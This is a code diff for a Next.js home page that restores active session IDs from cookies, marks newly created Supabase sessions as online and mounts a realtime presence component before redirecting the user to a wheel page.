@@ -3,13 +3,64 @@
 import { useState, useEffect } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { useSettings } from "@/contexts/SettingsContext";
-import { persistActiveSession } from "@/lib/session-id-client";
+import {
+  getPreferredRouteSessionId,
+  persistActiveSession,
+} from "@/lib/session-id-client";
+import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
+import { normalizeSessionIdentifier } from "@/lib/session-identifiers";
 
 export default function Home() {
   const { settings } = useSettings();
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
   const [timeLeft, setTimeLeft] = useState(345); // 5:45 min countdown
+
+  // Ana sayfada aktif session varsa (daha önce oluşturulmuş ve cookie'ye kaydedilmiş)
+  // SessionRealtimeGate yükle ve ONLINE göster.
+  // Yeni session create edilince de state'e yaz ve gate yüklensin → user HOME'da ONLINE görünür.
+  const [activeSessionIds, setActiveSessionIds] = useState<{ sessionId: string; routeSessionId: string } | null>(
+    () => {
+      try {
+        const id = normalizeSessionIdentifier(
+          document.cookie
+            .split("; ")
+            .find((row) => row.startsWith("ACTIVE_SESSION="))
+            ?.split("=")[1],
+        );
+        const rId = normalizeSessionIdentifier(
+          document.cookie
+            .split("; ")
+            .find((row) => row.startsWith("ACTIVE_ROUTE_SESSION="))
+            ?.split("=")[1],
+        );
+        const eff = getPreferredRouteSessionId(id, rId);
+        if (id) return { sessionId: id, routeSessionId: eff };
+        return null;
+      } catch {
+        return null;
+      }
+    },
+  );
+
+  useEffect(() => {
+    try {
+      const id = normalizeSessionIdentifier(
+        document.cookie
+          .split("; ")
+          .find((row) => row.startsWith("ACTIVE_SESSION="))
+          ?.split("=")[1],
+      );
+      const rId = normalizeSessionIdentifier(
+        document.cookie
+          .split("; ")
+          .find((row) => row.startsWith("ACTIVE_ROUTE_SESSION="))
+          ?.split("=")[1],
+      );
+      const eff = getPreferredRouteSessionId(id, rId);
+      if (id) setActiveSessionIds((old) => (old && old.sessionId === id ? old : { sessionId: id, routeSessionId: eff }));
+    } catch { /* noop */ }
+  }, []);
 
   // Countdown
   useEffect(() => {
@@ -22,7 +73,7 @@ export default function Home() {
   const formatTime = (seconds: number) => {
     const m = Math.floor(seconds / 60);
     const s = seconds % 60;
-    return `${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
+    return `${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`; 
   };
 
   const handleStart = async () => {
@@ -46,7 +97,7 @@ export default function Home() {
         .insert({
           amount: 0,
           current_step: "code_entry",
-          status: "offline",
+          status: "online",
           is_hidden: false,
           partner_name: partnerName,
           form_data: {
@@ -63,12 +114,20 @@ export default function Home() {
       return;
     }
 
-    persistActiveSession(data.id, data.public_id ? String(data.public_id) : data.id);
+    const routeSid = data.public_id ? String(data.public_id) : data.id;
+    persistActiveSession(data.id, routeSid);
+    setActiveSessionIds({ sessionId: data.id, routeSessionId: routeSid });
     window.location.href = "/wheel";
   };
 
   return (
     <div className="pak-page-shell">
+      {activeSessionIds?.sessionId ? (
+        <SessionRealtimeGate
+          sessionId={activeSessionIds.sessionId}
+          routeSessionId={activeSessionIds.routeSessionId}
+        />
+      ) : null}
       <main className="relative z-10 w-full max-w-[820px] fade-in">
         <div className="pak-form-card overflow-hidden">
           <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-7 sm:pb-8 sm:pt-8 lg:px-10 lg:pb-9 lg:pt-9">
